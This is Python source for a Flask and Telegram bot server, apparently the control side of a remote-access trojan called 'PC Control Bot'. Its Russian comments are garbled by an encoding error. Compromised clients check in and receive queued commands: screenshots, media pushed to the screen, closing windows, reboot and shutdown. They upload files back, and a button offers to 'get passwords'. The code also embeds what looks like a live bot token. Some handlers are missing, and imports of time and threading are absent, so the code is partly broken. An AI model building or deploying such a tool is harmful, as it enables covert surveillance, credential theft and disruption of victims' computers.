import os
import json
import uuid
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters

app = Flask(__name__)

# ===== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø =====
TOKEN = "8004274832:AAGbnNEvxH09Ja9OdH9KoEOFZfCl98LsqDU"  # –¢–æ–∫–µ–Ω –æ—Ç @BotFather
SECRET_KEY = "YOUR_SECRET_KEY"  # –î–æ–ª–∂–µ–Ω —Å–æ–≤–ø–∞–¥–∞—Ç—å —Å –∫–ª—é—á–æ–º –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ
PORT = int(os.environ.get('PORT', 5000))
# ========================

bot = Bot(token=TOKEN)
clients = {}  # –°–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –∫–ª–∏–µ–Ω—Ç–æ–≤
pending_commands = {}  # –û—á–µ—Ä–µ–¥—å –∫–æ–º–∞–Ω–¥

# –ú–µ–Ω—é —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
KEYBOARD_LAYOUT = [
    [InlineKeyboardButton("üñ• IP –∞–¥—Ä–µ—Å", callback_data='ip'),
     InlineKeyboardButton("üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç", callback_data='screenshot')],
    [InlineKeyboardButton("üé• –í–∏–¥–µ–æ –Ω–∞ —ç–∫—Ä–∞–Ω", callback_data='play_video'),
     InlineKeyboardButton("üñº –§–æ—Ç–æ –Ω–∞ —ç–∫—Ä–∞–Ω", callback_data='play_photo')],
    [InlineKeyboardButton("‚ùå Alt+F4", callback_data='altf4'),
     InlineKeyboardButton("üîí –ü–æ–ª—É—á–∏—Ç—å –ø–∞—Ä–æ–ª–∏", callback_data='passwords')],
    [InlineKeyboardButton("üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å", callback_data='reboot'),
     InlineKeyboardButton("‚èπ –í—ã–∫–ª—é—á–∏—Ç—å", callback_data='shutdown')],
    [InlineKeyboardButton("üëª –°–∫—Ä—ã—Ç—å/–ü–æ–∫–∞–∑–∞—Ç—å", callback_data='toggle_visibility')]
]

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞"""
    data = request.json
    if data.get('key') != SECRET_KEY:
        return jsonify({'status': 'unauthorized'}), 401
    
    client_id = data.get('ip', 'unknown')
    clients[client_id] = {
        'last_seen': datetime.now(),
        'ip': data.get('ip', ''),
        'status': 'online'
    }
    return jsonify({'status': 'ok'})

@app.route('/commands', methods=['GET'])
def get_commands():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥ –¥–ª—è –∫–ª–∏–µ–Ω—Ç–∞"""
    client_key = request.args.get('key')
    if client_key != SECRET_KEY:
        return jsonify([])
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    commands = pending_commands.get(client_ip, [])
    return jsonify(commands)

@app.route('/complete', methods=['POST'])
def complete_command():
    """–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã"""
    data = request.json
    if data.get('key') != SECRET_KEY:
        return jsonify({'status': 'unauthorized'}), 401
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    command_id = data.get('command_id')
    
    if client_ip in pending_commands:
        pending_commands[client_ip] = [
            cmd for cmd in pending_commands[client_ip] 
            if cmd.get('id') != command_id
        ]
    
    return jsonify({'status': 'ok'})

@app.route('/upload', methods=['POST'])
def upload_file():
    """–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–æ–≤ –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞"""
    if request.form.get('key') != SECRET_KEY:
        return jsonify({'status': 'unauthorized'}), 401
    
    file = request.files.get('file')
    file_type = request.form.get('type', 'file')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    if file:
        # –î–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –ø—Ä–æ—Å—Ç–æ —Å–æ—Ö—Ä–∞–Ω—è–µ–º —Ñ–∞–π–ª
        filename = f"{file_type}_{client_ip}_{int(datetime.now().timestamp())}"
        file.save(os.path.join('uploads', filename))
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'no_file'}), 400

def send_menu(chat_id):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ –º–µ–Ω—é —Å –∫–Ω–æ–ø–∫–∞–º–∏"""
    bot.send_message(
        chat_id=chat_id,
        text="üîí <b>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–æ—É—Ç–±—É–∫–æ–º</b> üîí\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
        reply_markup=InlineKeyboardMarkup(KEYBOARD_LAYOUT),
        parse_mode='HTML'
    )

def button_handler(update: Update, context):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏–π –∫–Ω–æ–ø–æ–∫"""
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    chat_id = query.message.chat_id
    
    try:
        # –ü–æ–ª—É—á–∞–µ–º –ø–µ—Ä–≤—ã–π –¥–æ—Å—Ç—É–ø–Ω—ã–π –∫–ª–∏–µ–Ω—Ç
        client_id = next(iter(clients.keys()), None)
        
        if not client_id:
            bot.send_message(chat_id, "‚ö†Ô∏è –ù–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤")
            return
        
        if data == 'ip':
            bot.send_message(chat_id, f"üì° IP –∞–¥—Ä–µ—Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: {clients[client_id]['ip']}")
        
        elif data == 'screenshot':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'screenshot',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "üì∏ –ó–∞–ø—Ä–æ—à–µ–Ω —Å–∫—Ä–∏–Ω—à–æ—Ç...")
        
        elif data == 'play_video':
            bot.send_message(chat_id, "üìπ –û—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∏–¥–µ–æ —Ñ–∞–π–ª...")
            context.user_data['awaiting_media'] = {'type': 'video', 'client': client_id}
        
        elif data == 'play_photo':
            bot.send_message(chat_id, "üñº –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ç–æ...")
            context.user_data['awaiting_media'] = {'type': 'image', 'client': client_id}
        
        elif data == 'altf4':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'altf4',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "‚úÖ –ö–æ–º–∞–Ω–¥–∞ Alt+F4 –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞")
        
        elif data == 'reboot':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'reboot',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "üîÑ –ö–æ–º–∞–Ω–¥–∞ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞")
        
        elif data == 'shutdown':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'shutdown',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "‚èπ –ö–æ–º–∞–Ω–¥–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞")
        
        # –û–±–Ω–æ–≤–ª—è–µ–º –º–µ–Ω—é
        send_menu(chat_id)
        bot.answer_callback_query(query.id)
    
    except Exception as e:
        bot.send_message(chat_id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}")

def media_handler(update: Update, context):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –º–µ–¥–∏–∞—Ñ–∞–π–ª–æ–≤"""
    media_info = context.user_data.get('awaiting_media')
    if not media_info:
        return
    
    chat_id = update.message.chat_id
    client_id = media_info.get('client')
    media_type = media_info.get('type')
    
    try:
        if media_type == 'image' and update.message.photo:
            photo = update.message.photo[-1]
            file = bot.get_file(photo.file_id)
            file_url = file.file_path
            
            command = {
                'id': str(uuid.uuid4()),
                'type': 'media',
                'media_type': 'image',
                'url': file_url,
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ")
        
        elif media_type == 'video' and update.message.video:
            video = update.message.video
            file = bot.get_file(video.file_id)
            file_url = file.file_path
            
            command = {
                'id': str(uuid.uuid4()),
                'type': 'media',
                'media_type': 'video',
                'url': file_url,
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            bot.send_message(chat_id, "‚úÖ –í–∏–¥–µ–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ")
        
        # –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –æ–∂–∏–¥–∞–Ω–∏—è
        del context.user_data['awaiting_media']
        send_menu(chat_id)
    
    except Exception as e:
        bot.send_message(chat_id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –º–µ–¥–∏–∞: {str(e)}")

def start_bot():
    """–ó–∞–ø—É—Å–∫ Telegram –±–æ—Ç–∞"""
    updater = Updater(token=TOKEN, use_context=True)
    dp = updater.dispatcher
    
    # –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
    dp.add_handler(CommandHandler('start', lambda u,c: send_menu(u.message.chat_id)))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.photo | Filters.video, media_handler))
    
    # –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
    updater.start_polling()
    updater.idle()

@app.route('/')
def home():
    return "PC Control Bot is running!"

def cleanup_clients():
    """–û—á–∏—Å—Ç–∫–∞ –Ω–µ–∞–∫—Ç–∏–≤–Ω—ã—Ö –∫–ª–∏–µ–Ω—Ç–æ–≤"""
    while True:
        now = datetime.now()
        for client_id, client_data in list(clients.items()):
            if now - client_data['last_seen'] > timedelta(minutes=5):
                del clients[client_id]
        time.sleep(300)

if __name__ == '__main__':
    # –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –¥–ª—è –∑–∞–≥—Ä—É–∑–æ–∫
    os.makedirs('uploads', exist_ok=True)
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –æ—á–∏—Å—Ç–∫—É –∫–ª–∏–µ–Ω—Ç–æ–≤ –≤ —Ñ–æ–Ω–µ
    threading.Thread(target=cleanup_clients, daemon=True).start()
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    threading.Thread(target=start_bot, daemon=True).start()
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º Flask —Å–µ—Ä–≤–µ—Ä
    app.run(host='0.0.0.0', port=PORT)
